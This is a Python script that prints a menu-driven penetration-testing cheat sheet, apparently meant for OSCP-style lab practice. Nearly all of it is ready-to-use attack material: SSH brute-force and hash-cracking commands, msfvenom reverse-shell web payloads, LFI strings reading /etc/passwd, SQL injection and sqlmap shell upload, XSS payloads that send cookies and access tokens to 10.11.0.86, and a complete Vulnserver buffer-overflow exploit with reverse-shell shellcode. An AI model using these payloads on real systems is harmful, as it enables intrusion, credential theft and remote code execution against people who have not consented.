from colorama import init
from termcolor import *

cprint("""

                                                                       __                     
                                                                  ...-'  |`.                  
                                                                  |      |  |                 
                                                              _.._....   |  |       .-''''-.  
.-,.--.     .-''` ''-.        .-''` ''-.         .|         .' .._| -|   |  |      /  .--.  \ 
|  .-. |  .'          '.    .'          '.     .' |_        | '      |   |  |     /  /    '-' 
| |  | | /              `  /              `  .'     |     __| |__ ...'   `--'    /  /.--.     
| |  | |'                ''                ''--.  .-'    |__   __||         |`. /  ' _   \    
| |  '- |         .-.    ||         .-.    |   |  |   ,.--. | |   ` --------\ |/   .' )   |   
| |     .        |   |   ..        |   |   .   |  |  //    \| |    `---------' |   (_.'   /   
| |      .       '._.'  /  .       '._.'  /    |  '.'\\    /| |                 \       '     
|_|       '._         .'    '._         .'     |   /  `'--' | |                   `----'      
             '-....-'`         '-....-'`       `'-'         |_|                               


                                                                      @Wpii5

""","red")

cprint("1 - nmap scan:\n2 - Enumeration HTTP:\n3 - MD5 Password Cracking\n4 - SSH Brute force\n5 - Web reverse shell\n6 - LFI Payload\n7 - SQL Payload\n8 - XSS Payload\n9 - Linux SUID,GUID privilege escaltion\n10 - Python Full tty shell\n11 - SSH Tunneling\n12 - Compiling\n13 - Windows buffer overflow ","green")
z = int(input())
if z == 1:
    print("""Default Scanning 

nmap -sV -sC  -oA nmap_default      <IP>

nmap -n -Pn  -sS -sV -A                 <IP>

nmap -n -Pn -sS  -T4 -p1-65535      <IP>
""")
elif z == 2:
    print("""
Gobuster Quick Directory bruteforcing

gobuster -u <IP> -w /home/kali/Desktop/wordlists/SecLists-master/Discovery/Web_Content/common.txt -t 80 -a Linux


Gobuster comprehensive directory busting

gobuster -s 200,204,301,302,307,403 -u <IP> -w /home/kali/Desktop/wordlists/SecLists-master/Discovery/Web_Content/big.txt -t 80


Gobuster search with file extension

gobuster -u <IP> -w /home/kali/Desktop/wordlists/SecLists-master/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

gobuster dir -u<IP> -w /home/kali/Desktop/wordlists/SecLists-master/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,sh,asp,aspx,jsp" -z  -t 80 
""")
elif z == 3:
    print("""
hashcat -m 500 -a 0 hash.txt rockyou.txt


john hashes.txt --format=raw-md5 -w /usr/share/wordlists/rockyou.txt""")
elif z == 4:
    print("""
hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> ssh

hydra -t 4 -L <userlist> -P /home/kali/Desktop/wordlists/rockyou.txt <IP> ssh


&&

https://github.com/lanjelot/patator

ssh_login host=10.0.0.1 user=FILE0 0=logins.txt password=$(perl -e "print 'A'x50000") --max-retries 0 --timeout 10 -x ignore:time=0-3


""")
elif z == 5:
    print("""
Web Payloads


#PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php


cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

#ASP
msfvenom -p windows/shell/reverse_tcp LHOST= LPORT= -f asp > shell.asp

#JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f raw > shell.jsp

#WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
""")
elif z == 6:
    print("""
    
http://example.com/index.php?page=../../../etc/passwd
http://test.com/index.php?page=php://filter/convert.base64-encode/resource=index
http://example.com/index.php?page=../../../etc/passwd%00
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
    """)
elif z == 7:
    print("""Payload = 

4 UNION ALL SELECT CONCAT(0x7170717171,0x4a4d49587173775551614e6748437865457769746a4d725344457473705a756b76635978426c4376,0x7162787a71),NULL-- -
 
 
 in response : 
 
qpqqqJMIXqswUQaNgHCxeEwitjMrSDEtspZukvcYxBlCvqbxzq ---->  




Using SQLmap to upload file 

--file-write="http://localhost/pub/shell" --file-dest="/var/www/html/BOX-5/"



-privileges -roles   -> to get the privileges for the sql users


--users  to dump the users


-U root<replace with your username> --roles  to get the priv for the users """)
elif z == 8:
    print("""https://github.com/Abdallah-Fouad-X/advanced-xss-payload-/blob/master/xss-ADV.txt

">><script>new Image().src="http://10.11.0.86/bogus.php?output="+document.cookie;</script>

<script>document.location='http://10.11.0.86/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://10.11.0.86/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://10.11.0.86:3119/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://10.11.0.86/cookie.php?c="+localStorage.getItem('access_token');</script>
<script>new Image().src="http://10.11.0.86:5644"</script>
<iframe SRC="http://10.11.0.86:5644/" height = "0" width="0"></iframe>
<iframe SRC="http://10.11.0.86:/5644/" height = "0" width="0"></iframe>


&& blind Xss 

https://xsshunter.com/


To read local local file 

<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
""")
elif z == 9:
    print("""#find GUID

find / -perm -g=s -type f 2>/dev/null    

#find SUID

find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null""")
elif z == 10:
    print("""python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo 

export TERM=xterm""")
elif z == 11:
    print("""
sshuttle

sshuttle -vvr user@10.10.10.10 10.1.1.0/24


Local port forwarding

ssh <gateway> -L <local port to listen>:<remote host>:<remote port>


Remote port forwarding

ssh <gateway> -R <remote port to bind>:<local host>:<local port>


Dynamic port forwarding

ssh -D <local proxy port> -p <remote port> <target>


Plink local port forwarding

plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>

Dynamic port forwarding

ssh -D <local proxy port> -p <remote port> <target> 

ssh -nNTf -D <local proxy port> -p <remote port> <target> """)
elif z == 12:
    print("""


c to exe

i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
i686-w64-mingw32-gcc 646.c -lws2_32 -o 646_mod.exe
wine 646_mod.exe

c to elf 

gcc -m32 -o output input.c      {32 bit envornment}
gcc -m64 -o output input.c 
gcc -m32 -Wl,--hash-style=both udev.c -o udev      {for glib <= 2.5 environment}
gcc -Wall -m32 -Wl,--hash-style=both -o sendpage 9545.c                            {also remove floating point exception}


For 64-bit use: x86_64-w64-mingw32-gc++

For 32-bit use: i686-w64-mingw32-g++


Compile from C to bin
 
gcc -o FilenameForLinux Filename.c -lcrypto

EX:
gcc -o OpenFuck openfuck.c -lcrypto""")
elif z == 13:
    print("""
    1 - Fuzzing : 


from metasploit to creat battern 
 
   →   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
------------------------


command used:
    msf-pattern create -l <length>



#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msf-pattern create -l <length>

buffer = <msf-pattern_create code)

try:
     print "sending buffer..."
     s.connect(('192.168.1.239',9999))
     s.send("TRUN ." + buffer + '\r\n')
     data = s.recv(1024)
     print "\nDone!"                                                                                                                                                                                            
                                                                                                                                                                                                                
except:                                                                                                                                                                                                         
     print "Count not connect to Vulnserver" 

    
    2 - OffSet :
    

msf-pattern-offset -l <length> -q <value of ESP>


#!/usr/bin/python                                                                                                                                                                                               
import socket                                                                                                                                                                                                   
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                                                                                                                           
                                                                                                                                                                                                                
# msf-pattern create -l 3000                                                                                                                                                                                    
# offset 2006                                                                                                                                                                                                   

filler = "A" * 2006
eip = "B" * 4
buffer = "C" * 990

inputbuffer = filler + eip + buffer

try:
     print "sending buffer..."
     s.connect(('192.168.1.239',9999))
     s.send("TRUN ." + inputbuffer + '\r\n')
     data = s.recv(1024)
     print "\nDone!"

except:
     print "Count not connect to Vulnserver"

     3 - Create more space : 
     by double the length, and look into the stack if we have enough space
     https://thinkloveshare.com/en/hacking/pwn_1of4_buffer_overflow/



To Disable ASLR


As root:
echo 0 > /proc/sys/kernel/randomize_va_space

NOP character, ‘\x90’. NOP, representing No OP, means exactly that, no operation will take place and the CPU will skip over the instruction. Sometimes shellcode reliability can be increased by padding the start of your exploit jump location with NOPs before reaching your shellcode. We’ll add 20 NOP’s to the start of our final code in order to improve reliability. Below is a final code combining all the elements that’s been outlined.






“A” * 2003 -> Till the offset + “EIP Adders” + “\x90” -> NOP * 32 + exploit (shell code)


///

NOP , it can be anything , so 100 chars will be good
NOP = "\x90" * 100
Ok our exploit is ready , we just need to print out the final payload so :
print pad + EIP + NOP + shellcode




‘\x90’*(offset - len(shellcode) -4(number of chars))

overWriteEIP = "\x41"*4

4 - BadChars :
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

Steps:


     1.   !mona config -set workingfolder c:\logs\%p


     2.  !mona bytearray



     3.  then drop bytearray.txt in our exploit
     
     
     4. then run the exploit, and take note of the memory address where the badchars string should begin (dump ESP)
     
     
     5. !mona compare -f C:\logs\<filename>\bytearray.bin -a <address>
     
     
     
     
     6. !mona bytearray –cpb "\x00"  (remove the badchar)
     
     7. !mona compare -f C:\logs\<filename>\bytearray.bin -a <address>          (updated with the badchar)
     
     
     
     
     
     7. !mona bytearray –cpb "\x00#x0a"  (remove the badchar)
     
     8. !mona compare -f C:\logs\<filename>\bytearray.bin -a <address>
     
     
     and continue this way, until you got no badchars anymore
     
     Example : 
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# badchars \x00
# msf-pattern create -l 3000
# offset 2006

filler = "A" * 2006
eip = "B" * 4
buffer = "C" * 990

inputbuffer = filler + eip + badchars

try:
     print "sending buffer..."
     s.connect(('192.168.1.239',9999))
     s.send("TRUN ." + inputbuffer + '\r\n')
     data = s.recv(1024)
     print "\nDone!"

except:
     print "Count not connect to Vulnserver"

5 - JMP ESP : 


JMP ESP = /xff/xe4


 1. !mona modules
        
            -> find a dll/exe that a has no security implantations
            

2. !mona find -s /xff/xe4 -m <dll/exe>


6 - Shell code : 

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f c -e x86/shikata_ga_nai -b "<badchars>"






#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.233.129 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00"

shellcode = ("<shellcode>")
# badchars \x00
# msf-pattern create -l 3000
# offset 2006
# 625011AF

filler = "A" * 2006
eip = "\xAF\x11\x50\x62"
nop = "\x90" * 10

inputbuffer = filler + eip + nop + shellcode

try:
     print "sending buffer..."
     s.connect(('192.168.1.239',9999))
     s.send("TRUN ." + inputbuffer + '\r\n')
     data = s.recv(1024)
     print "\nDone!"

except:
     print "Count not connect to Vulnserver"

     
    
    """)
